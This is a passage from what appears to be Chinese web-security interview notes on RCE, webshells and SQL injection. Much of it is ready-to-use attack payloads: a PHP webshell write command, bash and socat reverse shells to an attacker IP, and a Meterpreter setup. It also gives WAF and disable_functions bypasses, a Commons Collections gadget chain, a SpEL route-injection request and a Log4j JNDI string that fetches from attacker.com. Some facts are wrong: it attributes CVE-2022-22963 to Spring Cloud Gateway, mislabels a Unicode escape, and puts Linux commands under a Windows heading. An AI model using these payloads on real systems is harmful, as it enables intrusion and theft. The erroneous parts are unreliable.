<th>触发原因</th>
<th>典型场景 &#x2F; 例子</th>
</tr>
</thead>
<tbody><tr>
<td>PHP 反序列化</td>
<td><code>unserialize()</code>解析恶意序列化字符串，触发魔术方法（__wakeup&#x2F;__destruct）</td>
<td>- 场景：用户输入被直接传入<code>unserialize()</code>；  - 例子：构造 POP 链调用<code>eval()</code>执行代码。</td>
</tr>
<tr>
<td>Java 反序列化</td>
<td>反序列化恶意对象，触发链调用执行命令（如 Commons Collections 漏洞）</td>
<td>- Payload：利用 CC 链构造的序列化数据，触发<code>Runtime.getRuntime().exec(&quot;id&quot;)</code>。</td>
</tr>
<tr>
<td>Python 反序列化</td>
<td><code>pickle.loads()</code>解析恶意数据，执行内嵌的代码</td>
<td>- 漏洞代码：<code>pickle.loads(request.data)</code>；  - Payload：构造包含<code>os.system(&#39;ls&#39;)</code>的 pickle 数据。</td>
</tr>
</tbody></table>
<h4 id="文件上传-1"><a href="#文件上传-1" class="headerlink" title="文件上传"></a>文件上传</h4><table>
<thead>
<tr>
<th>漏洞类型</th>
<th>触发原因</th>
<th>典型场景 &#x2F; 例子</th>
</tr>
</thead>
<tbody><tr>
<td>文件上传漏洞</td>
<td>上传恶意脚本文件（如 PHP&#x2F;ASPX），且文件能被服务器解析</td>
<td>- 场景：上传<code>shell.php</code>（内容<code>&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</code>）到 Web 可访问目录；  - 访问该文件即可执行任意代码。</td>
</tr>
<tr>
<td>文件包含漏洞（LFI&#x2F;RFI）</td>
<td>包含本地 &#x2F; 远程恶意脚本文件，触发代码执行</td>
<td>- 本地包含（LFI）：<code>include($_GET[&#39;file&#39;])</code> → Payload：<code>?file=../../upload/shell.php</code>；  - 远程包含（RFI）：开启<code>allow_url_include</code>后，包含远程 PHP 脚本。</td>
</tr>
<tr>
<td>路径遍历 + 文件写入</td>
<td>写入恶意脚本到 Web 目录，再通过访问文件执行</td>
<td>- 场景：<code>file_put_contents($_GET[&#39;path&#39;], $_POST[&#39;content&#39;])</code>；  - Payload：<code>?path=/var/www/html/shell.php</code> + POST 内容：<code>&lt;?php system(&#39;ls&#39;);?&gt;</code>。</td>
</tr>
</tbody></table>
<h4 id="配置-权限错误类"><a href="#配置-权限错误类" class="headerlink" title="配置 &#x2F; 权限错误类"></a>配置 &#x2F; 权限错误类</h4><table>
<thead>
<tr>
<th>漏洞类型</th>
<th>触发原因</th>
<th>典型场景 &#x2F; 例子</th>
</tr>
</thead>
<tbody><tr>
<td>弱口令 &#x2F; 未授权访问</td>
<td>登录后台后可执行代码（如后台有 “代码执行” 功能、“命令行” 工具）</td>
<td>- 场景：Tomcat 弱口令登录后台，部署 war 包执行代码；  - 例子：Jenkins 未授权访问，执行构建脚本触发命令执行。</td>
</tr>
<tr>
<td>危险配置开启</td>
<td>框架 &#x2F; 服务器开启危险功能，允许执行代码</td>
<td>- 场景：PHP 开启<code>register_globals</code>&#x2F;<code>allow_url_include</code>；  - 例子：Python Flask 开启<code>debug=True</code>，调试模式下的 PIN 码破解后执行代码。</td>
</tr>
<tr>
<td>容器 &#x2F; 云服务配置错误</td>
<td>Docker&#x2F;K8s&#x2F;S3 存储桶配置不当，导致执行恶意代码</td>
<td>- 场景：Docker API 未授权访问，创建容器并挂载主机目录执行命令；  - 例子：S3 存储桶公开写权限，上传恶意脚本并触发执行。</td>
</tr>
</tbody></table>
<h2 id="代码执行的函数有什么？"><a href="#代码执行的函数有什么？" class="headerlink" title="代码执行的函数有什么？"></a>代码执行的函数有什么？</h2><h2 id="代码执行的函数有哪些？"><a href="#代码执行的函数有哪些？" class="headerlink" title="代码执行的函数有哪些？"></a>代码执行的函数有哪些？</h2><p>代码执行函数指直接将输入作为代码解析执行的函数，分语言举例：</p>
<ul>
<li><p>PHP：<code>eval()</code>、<code>assert()</code>、<code>preg_replace()</code>（带<code>/e</code>修饰符）、<code>array_map ()</code>、<code>create_function()</code>、<code>call_user_func ()</code></p>
</li>
<li><p>Python：<code>exec()</code>、<code>eval()</code></p>
</li>
<li><p>Java：<code>ScriptEngine.eval()</code>（如 Rhino 引擎）、<code>Runtime.exec()</code>（间接执行字节码）</p>
</li>
<li><p>JavaScript：<code>eval()</code></p>
</li>
</ul>
<h2 id="命令执行的函数有哪些？"><a href="#命令执行的函数有哪些？" class="headerlink" title="命令执行的函数有哪些？"></a>命令执行的函数有哪些？</h2><p>命令执行函数指直接调用操作系统命令的函数，分语言 &#x2F; 场景举例：</p>
<ul>
<li><p>PHP：<code>system()</code>、<code>exec()</code>、<code>shell_exec()</code>、<code>passthru()</code>、<code>popen()</code>、<code>proc_open()</code></p>
</li>
<li><p>Python：<code>os.system()</code>、<code>os.popen()</code>、<code>subprocess.call()</code>、<code>subprocess.Popen()</code></p>
</li>
<li><p>Java：<code>Runtime.getRuntime().exec()</code></p>
</li>
<li><p>系统层面：Linux 的<code>system()</code>、Windows 的<code>CreateProcess()</code></p>
</li>
</ul>
<h2 id="php-能远程执行的函数有什么？"><a href="#php-能远程执行的函数有什么？" class="headerlink" title="php 能远程执行的函数有什么？"></a>php 能远程执行的函数有什么？</h2><p>PHP 中可用于远程执行（代码 &#x2F; 命令）的函数主要包括：</p>
<ul>
<li><p><strong>代码执行</strong>：<code>eval()</code>、<code>assert()</code>（5.4 前）、<code>create_function()</code>、<code>preg_replace(&#39;/pattern/e&#39;, ...)</code>（PHP 7.0 前）、<code>call_user_func()</code>（动态调用执行函数）。</p>
</li>
<li><p><strong>命令执行</strong>：<code>system()</code>、<code>exec()</code>、<code>shell_exec()</code>、<code>passthru()</code>、<code>popen()</code>、<code>proc_open()</code>。</p>
</li>
<li><p><strong>间接执行</strong>：<code>include()</code>&#x2F;<code>require()</code>（远程包含文件时执行代码，需<code>allow_url_include=On</code>）。</p>
</li>
</ul>
<h2 id="RCE-漏洞有什么危害、利用方式及防御措施？"><a href="#RCE-漏洞有什么危害、利用方式及防御措施？" class="headerlink" title="RCE 漏洞有什么危害、利用方式及防御措施？"></a>RCE 漏洞有什么危害、利用方式及防御措施？</h2><ul>
<li><p><strong>危害</strong>： 攻击者可完全控制目标系统（如读取 &#x2F; 篡改文件、窃取数据）、横向渗透内网、植入恶意程序（如勒索软件,挖矿）、瘫痪服务等，是最高危漏洞之一。</p>
</li>
<li><p><strong>利用方式</strong>： 直接执行命令（如<code>ls</code>、<code>whoami</code>）获取信息；写入 webshell 持久化控制；通过命令提权（如<code>sudo</code>、内核漏洞）获取更高权限；下载恶意文件（如<code>wget</code>）扩大影响。</p>
</li>
<li><p><strong>防御措施</strong>：</p>
</li>
<li><p>输入严格过滤：用白名单限制允许的字符 &#x2F; 命令，禁止特殊符号（如<code>;</code>、<code>|</code>、<code>&amp;</code>）。</p>
</li>
<li><p>避免直接拼接执行：使用安全 API（如参数化调用，避免<code>system(&quot;cmd &quot; + input)</code>）。</p>
</li>
<li><p>最小权限运行：应用程序以低权限用户（如 www-data）运行，限制文件 &#x2F; 系统访问权限。</p>
</li>
<li><p>禁用危险函数：通过<code>php.ini</code>的<code>disable_functions</code>禁用<code>eval</code>、<code>system</code>等。</p>
</li>
</ul>
<h2 id="通过RCE怎么去拿shell？"><a href="#通过RCE怎么去拿shell？" class="headerlink" title="通过RCE怎么去拿shell？"></a>通过RCE怎么去拿shell？</h2><h4 id="写马"><a href="#写马" class="headerlink" title="写马"></a>写马</h4><p>linux</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27; &gt; /var/www/html/shell.php</span><br></pre></td></tr></table></figure>

<p>windows<br>注意特殊转义符号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ^&lt;?php @eval($_POST[&quot;cmd&quot;]);?^&gt; &gt; C:\www\shell.php</span><br></pre></td></tr></table></figure>

<h2 id="cat如何绕WAF？"><a href="#cat如何绕WAF？" class="headerlink" title="cat如何绕WAF？"></a>cat如何绕WAF？</h2><h4 id="读文件命令替换"><a href="#读文件命令替换" class="headerlink" title="读文件命令替换"></a>读文件命令替换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cat</span><br><span class="line">more:一页一页的显示档案内容 </span><br><span class="line">less:与 more 类似</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">od -c:八进制显示</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">sh /flag 2&gt;%261 //报错出文件内容</span><br><span class="line">curl file:///root/f/flag</span><br><span class="line">strings flag</span><br><span class="line">uniq -c flag</span><br><span class="line">bash -v flag</span><br><span class="line">rev flag</span><br></pre></td></tr></table></figure>



<h2 id="绕-php-ini-中-disable-function-的限制？有哪些方法？其中成功率最高的是哪个？为什么？"><a href="#绕-php-ini-中-disable-function-的限制？有哪些方法？其中成功率最高的是哪个？为什么？" class="headerlink" title="绕 php.ini 中 disable_function 的限制？有哪些方法？其中成功率最高的是哪个？为什么？"></a>绕 php.ini 中 disable_function 的限制？有哪些方法？其中成功率最高的是哪个？为什么？</h2><p>LD_PRELOAD 劫持（Linux）：上传自定义共享库（.so 文件），通过putenv(“LD_PRELOAD&#x3D;&#x2F;tmp&#x2F;evil.so”)预加载，劫持system等函数实现命令执行。<br>PHP 扩展漏洞：利用imap、gd等扩展的漏洞（如imap_open的命令注入）绕过限制。<br>FFI 扩展：若启用FFI（Foreign Function Interface），可直接调用系统函数执行命令。<br>Windows COM 组件：在 Windows 系统中，通过COM(“WScript.Shell”)调用系统命令。</p>
<p><strong>成功率最高的是 LD_PRELOAD 劫持</strong>： 原因：兼容性强（适用于大多数 Linux 系统），无需依赖特定 PHP 扩展（仅需<code>putenv</code>和<code>mail</code>等未被禁用的函数），且实现逻辑简单（通过动态链接库劫持系统函数），对环境要求低，因此实际场景中成功率最高。</p>
<h1 id="面试篇"><a href="#面试篇" class="headerlink" title="面试篇"></a>面试篇</h1><h3 id="代码执行、命令执行的函数有哪些？"><a href="#代码执行、命令执行的函数有哪些？" class="headerlink" title="代码执行、命令执行的函数有哪些？"></a><strong>代码执行、命令执行的函数有哪些？</strong></h3><p>前面写了，这里就不赘述了</p>
<h3 id="正向-Shell-和反向-Shell-区别？"><a href="#正向-Shell-和反向-Shell-区别？" class="headerlink" title="正向 Shell 和反向 Shell 区别？"></a><strong>正向 Shell 和反向 Shell 区别？</strong></h3><ul>
<li><p><strong>正向 Shell（目标机执行）</strong>：<br>  <code>nc -lvp 8888 -e /bin/bash</code>（目标绑定 8888 端口，执行 bash）<br>  攻击者执行：<code>nc 目标IP 8888</code> → 获取 Shell。</p>
</li>
<li><p><strong>反向 Shell（目标机执行）</strong>：<br>  攻击者先监听：<code>nc -lvp 8888</code><br>  目标机执行：<code>bash -i &gt;&amp; /dev/tcp/攻击者IP/8888 0&gt;&amp;1</code> → 主动连攻击者，交出 Shell。</p>
</li>
</ul>
<h3 id="如何从非交互的-Shell-提升为交互-Shell？"><a href="#如何从非交互的-Shell-提升为交互-Shell？" class="headerlink" title="如何从非交互的 Shell 提升为交互 Shell？"></a><strong>如何从非交互的 Shell 提升为交互 Shell？</strong></h3><h4 id="Windows系统"><a href="#Windows系统" class="headerlink" title="Windows系统"></a>Windows系统</h4><p><strong>法一：python提交互</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 目标机执行（需安装Python）</span></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="comment"># 进阶：设置TERM环境变量，补全更友好</span></span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">export TERM=xterm</span><br><span class="line">stty raw -echo; fg  <span class="comment"># 回车后即可交互</span></span><br></pre></td></tr></table></figure>

<p><strong>法二：script命令</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script /dev/null -c bash  <span class="comment"># /dev/null模拟终端，-c执行bash</span></span><br></pre></td></tr></table></figure>

<p><strong>法三：socat提权</strong><br>socat 提权（稳定性最高）<br>攻击者端：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat file:tty,raw,echo=0 tcp-listen:8888</span><br></pre></td></tr></table></figure>

<p>目标端：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:攻击者IP:8888</span><br></pre></td></tr></table></figure>

<p><strong>法四：利用msfconsole提权</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 攻击者端（msf）</span></span><br><span class="line">msfconsole</span><br><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line"><span class="built_in">set</span> PAYLOAD python/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 你的IP</span><br><span class="line"><span class="built_in">set</span> LPORT 8888</span><br><span class="line">run</span><br><span class="line"><span class="comment"># 目标端执行生成的Python命令，获取meterpreter交互Shell</span></span><br></pre></td></tr></table></figure>

<h4 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a>Linux系统</h4><p><strong>PHP disable_functions() 绕过方法？</strong><br><strong>PHP 的 %00 截断的原理</strong><br><strong>站库分离怎么拿 Shell</strong></p>
<h1 id="java-rce篇"><a href="#java-rce篇" class="headerlink" title="java-rce篇"></a>java-rce篇</h1><h2 id="Java反序列化漏洞导致RCE的核心原理，并以Apache-Commons-Collections-3-x为例，描述攻击链的构造过程（需包含关键类和方法）"><a href="#Java反序列化漏洞导致RCE的核心原理，并以Apache-Commons-Collections-3-x为例，描述攻击链的构造过程（需包含关键类和方法）" class="headerlink" title="Java反序列化漏洞导致RCE的核心原理，并以Apache Commons Collections 3.x为例，描述攻击链的构造过程（需包含关键类和方法）"></a>Java反序列化漏洞导致RCE的核心原理，并以Apache Commons Collections 3.x为例，描述攻击链的构造过程（需包含关键类和方法）</h2><p><strong>环境</strong>：<strong>Apache Commons Collections 3.x</strong> 框架</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="comment">// 第1个Transformer：返回固定常量 → Runtime.class（Runtime类的Class对象）</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 第2个Transformer：反射调用Runtime.class.getMethod(&quot;getRuntime&quot;, null)</span></span><br><span class="line">    <span class="comment">// 参数说明：</span></span><br><span class="line">    <span class="comment">// &quot;getMethod&quot; → 要调用的方法名；</span></span><br><span class="line">    <span class="comment">// new Class[]&#123;String.class, Class[].class&#125; → getMethod的参数类型（方法名+参数类型数组）；</span></span><br><span class="line">    <span class="comment">// new Object[]&#123;&quot;getRuntime&quot;, null&#125; → getMethod的参数值（获取getRuntime()方法，无参数）；</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 第3个Transformer：反射调用上面得到的Method.invoke(null, null)</span></span><br><span class="line">    <span class="comment">// 作用：执行getRuntime()方法（静态方法，第一个参数为null），得到Runtime实例；</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 第4个Transformer：反射调用Runtime实例.exec(&quot;calc.exe&quot;)，执行系统命令；</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>防御</strong>：升级到Commons Collections 4.0+，或使用<code>SerialKiller</code>等反序列化过滤器</p>
<h2 id="在Spring框架中，如何通过SpEL（Spring-Expression-Language）注入实现RCE？请结合CVE-2022-22963漏洞说明利用条件及Payload构造。"><a href="#在Spring框架中，如何通过SpEL（Spring-Expression-Language）注入实现RCE？请结合CVE-2022-22963漏洞说明利用条件及Payload构造。" class="headerlink" title="在Spring框架中，如何通过SpEL（Spring Expression Language）注入实现RCE？请结合CVE-2022-22963漏洞说明利用条件及Payload构造。"></a>在Spring框架中，如何通过SpEL（Spring Expression Language）注入实现RCE？请结合<a target="_blank" rel="noopener" href="https://cn-sec.com/archives/tag/cve-2022-22963">CVE-2022-22963</a>漏洞说明利用条件及Payload构造。</h2><ul>
<li><p><strong>漏洞背景</strong>：Spring Cloud Gateway在3.1.0及以下版本中，未对<code>X-Forwarded-Prefix</code>头进行过滤，导致SpEL表达式注入。</p>
</li>
<li><p><strong>利用条件</strong>：目标启用Actuator API且路由配置允许动态修改。<br>payload构造</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/gateway/routes/test_route HTTP/1.1</span><br><span class="line">&#123;</span><br><span class="line">  &quot;predicates&quot;: [&#123;</span><br><span class="line">    &quot;name&quot;: &quot;Path&quot;,</span><br><span class="line">    &quot;args&quot;: &#123;&quot;_genkey_0&quot;:&quot;/test_route&quot;&#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  &quot;filters&quot;: [&#123;</span><br><span class="line">    &quot;name&quot;: &quot;AddResponseHeader&quot;,</span><br><span class="line">    &quot;args&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;X-Response&quot;,</span><br><span class="line">      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(&#x27;id&#x27;).getInputStream()))&#125;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>触发执行</strong>：访问<code>/actuator/gateway/refresh</code>刷新配置后，请求<code>/test_route</code>触发表达式解析。</p>
</li>
<li><p><strong>修复</strong>：升级到3.1.1+，禁用动态路由或过滤危险Header。</p>
</li>
</ul>
<h2 id="假设目标系统对用户输入的RCE-Payload进行了黑名单过滤（如禁止Runtime、ProcessBuilder等关键词），请列举三种绕过方式并举例说明。"><a href="#假设目标系统对用户输入的RCE-Payload进行了黑名单过滤（如禁止Runtime、ProcessBuilder等关键词），请列举三种绕过方式并举例说明。" class="headerlink" title="假设目标系统对用户输入的RCE Payload进行了黑名单过滤（如禁止Runtime、ProcessBuilder等关键词），请列举三种绕过方式并举例说明。"></a>假设目标系统对用户输入的RCE Payload进行了黑名单过滤（如禁止<code>Runtime</code>、<code>ProcessBuilder</code>等关键词），请列举三种绕过方式并举例说明。</h2><p><strong>反射调用</strong>：通过反射获取<code>Runtime</code>类：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.&quot; + &quot;Runtime&quot;);</span><br><span class="line">clazz.getMethod(&quot;exec&quot;, String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(null), &quot;calc&quot;);</span><br></pre></td></tr></table></figure>

<p><strong>Unicode&#x2F;Hex编码</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// u0020 表示空格，绕过字符串检测</span><br><span class="line">String cmd = &quot;cu&quot; + &quot;u0020&quot; + &quot;rl example.com&quot;;</span><br></pre></td></tr></table></figure>

<p><strong>利用其他危险类</strong>：如<code>ScriptEngine</code>执行JS代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">new javax.script.ScriptEngineManager()</span><br><span class="line">  .getEngineByName(&quot;JavaScript&quot;)</span><br><span class="line">  .eval(&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;);</span><br></pre></td></tr></table></figure>

<h2 id="如何通过静态分析工具（如CodeQL）挖掘Java应用中潜在的RCE反序列化链？请描述关键分析步骤。"><a href="#如何通过静态分析工具（如CodeQL）挖掘Java应用中潜在的RCE反序列化链？请描述关键分析步骤。" class="headerlink" title="如何通过静态分析工具（如CodeQL）挖掘Java应用中潜在的RCE反序列化链？请描述关键分析步骤。"></a>如何通过静态分析工具（如CodeQL）挖掘Java应用中潜在的RCE反序列化链？请描述关键分析步骤。</h2><p><strong>识别危险方法</strong>：定义Sink点（如<code>Runtime.exec()</code>、<code>Method.invoke()</code>）。<br><strong>追踪数据流</strong>：从反序列化入口（<code>ObjectInputStream.readObject()</code>）到Sink点的数据流路径。<br><strong>识别Gadget链</strong>：查找可连接Sink与Sou<a target="_blank" rel="noopener" href="https://cn-sec.com/archives/tag/rce">rce</a>的调用链（如<code>readObject()</code> → <code>Transformer.transform()</code> → <code>InvokerTransformer</code>）。<br><strong>过滤无害调用</strong>：排除无参数传递或不可控的路径。<br><strong>验证利用可行性</strong>：检查类是否可实例化、方法是否公开等。</p>
<ul>
<li><strong>示例CodeQL查询</strong>：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from Callable source, Callable sink</span><br><span class="line">where source.getAParameter().getType().hasName(&quot;ObjectInputStream&quot;)</span><br><span class="line">  and sink.hasName(&quot;exec&quot;)</span><br><span class="line">  and exists(DataFlow::path(source, sink))</span><br><span class="line">select sink, source</span><br></pre></td></tr></table></figure>

<h2 id="如何绕过Java-Security-Manager的沙箱限制实现RCE？请举例说明。"><a href="#如何绕过Java-Security-Manager的沙箱限制实现RCE？请举例说明。" class="headerlink" title="如何绕过Java Security Manager的沙箱限制实现RCE？请举例说明。"></a>如何绕过Java Security Manager的沙箱限制实现RCE？请举例说明。</h2><p>漏洞场景：若策略文件配置错误（如允许createClassLoader权限）。<br>绕过方式：<br>定义恶意类加载器：通过自定义ClassLoader加载并执行字节码。<br>利用JNI本地库：调用JNI方法执行本地代码（需loadLibrary权限）。<br>反射修改Policy：通过反射修改Policy对象，动态添加权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Field policyField = Policy.class.getDeclaredField(&quot;policy&quot;);</span><br><span class="line">policyField.setAccessible(true);</span><br><span class="line">Policy policy = (Policy) policyField.get(null);</span><br><span class="line">// 添加AllPermission到策略</span><br></pre></td></tr></table></figure>

<h2 id="Log4j2的JNDI注入漏洞（CVE-2021-44228）如何导致RCE？请说明攻击流程及防御方案。"><a href="#Log4j2的JNDI注入漏洞（CVE-2021-44228）如何导致RCE？请说明攻击流程及防御方案。" class="headerlink" title="Log4j2的JNDI注入漏洞（CVE-2021-44228）如何导致RCE？请说明攻击流程及防御方案。"></a>Log4j2的JNDI注入漏洞（CVE-2021-44228）如何导致RCE？请说明攻击流程及防御方案。</h2><p><strong>攻击流程：</strong><br>攻击者在日志中注入<code>$&#123;jndi:ldap://attacker.com/Exploit&#125;</code>。<br>Log4j2解析日志时触发JNDI请求，从恶意服务器加载远程类。<br>恶意类（如Exploit.class）的静态代码块中执行<code>Runtime.getRuntime().exec(&quot;curl attacker.com/shell&quot;)</code>。<br><strong>防御：</strong><br>升级到Log4j 2.17.0+，默认禁用JNDI查找。<br>设置环境变量LOG4J_FORMAT_MSG_NO_LOOKUPS&#x3D;true。<br>使用WAF过滤${jndi:等关键字。</p>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><h4 id="post和get都做了防注入，用什么方法绕"><a href="#post和get都做了防注入，用什么方法绕" class="headerlink" title="post和get都做了防注入，用什么方法绕"></a>post和get都做了防注入，用什么方法绕</h4><p>许多 Web 应用程序不仅处理 POST 和 GET 数据，还会依赖于 HTTP 请求头中的信息。如果这些头信息没有经过严格的过滤，就可能成为注入点</p>
<ul>
<li><p><strong>User-Agent：</strong> 很多网站会记录访问者的 User-Agent 信息。如果后台程序直接将 User-Agent 拼接到 SQL 查询中，就可能存在注入</p>
</li>
<li><p><strong>X-Forwarded-For：</strong> 这个头通常用于获取用户的真实 IP 地址。当网站部署了负载均衡或 CDN 时，它会记录用户的原始 IP。同样，如果处理不当，也可能成为注入点</p>
</li>
<li><p><strong>Cookie：</strong> 网站通常会使用 Cookie 来存储会话信息或其他用户数据。如果 Cookie 中的某个值直接参与了 SQL 查询，就可能被利用</p>
</li>
<li><p><strong>Referer：</strong> 网站会记录用户是从哪个页面跳转过来的。如果这个信息直接被用于查询，同样存在风险<br><strong>绕过方式：</strong> 以 User-Agent 为例，你可以使用 Burp Suite 或其他抓包工具，在请求头中修改 User-Agent 的值，构造 SQL 注入 Payload。 例如：<code>User-Agent: &#39; OR 1=1--</code></p>
</li>
</ul>
<h4 id="单引号过滤绕过"><a href="#单引号过滤绕过" class="headerlink" title="单引号过滤绕过"></a>单引号过滤绕过</h4><h5 id="双引号"><a href="#双引号" class="headerlink" title="双引号"></a>双引号</h5><h5 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h5><p>完整 URL 注入： <code>id=0x27206f7220313d31202d2d20</code><br>最终执行的 SQL： <code>SELECT * FROM users WHERE id = &#39;or 1=1 -- &#39;</code></p>
<h5 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h5><p>%df<br><code>SELECT * FROM users WHERE id = &#39;1運&#39;&#39;...</code> (<code>&#39;運&#39;</code> 是一个汉字) 后面的 <code>&#39;</code> 就成为我们控制的单引号</p>
<h5 id="反斜线-绕过addslashes"><a href="#反斜线-绕过addslashes" class="headerlink" title="反斜线 \ 绕过addslashes"></a>反斜线 \ 绕过addslashes</h5><p>在某些情况下，如果后端代码没有过滤反斜线，你可以通过注入一个反斜线来“吃掉” <code>addslashes</code> 自动添加的反斜线<br><strong>原始查询：</strong> <code>SELECT * FROM users WHERE id = &#39;...注入点...&#39;</code><br><strong>注入尝试：</strong> <code>id=1\&#39;</code><br><strong>服务器端处理：</strong></p>
<ol>
<li><p>PHP 的 <code>addslashes()</code> 函数收到 <code>1&#39;</code></p>
</li>
<li><p>它在 <code>&#39;</code> 前面加上 <code>\</code>，变成 <code>1\&#39;</code></p>
</li>
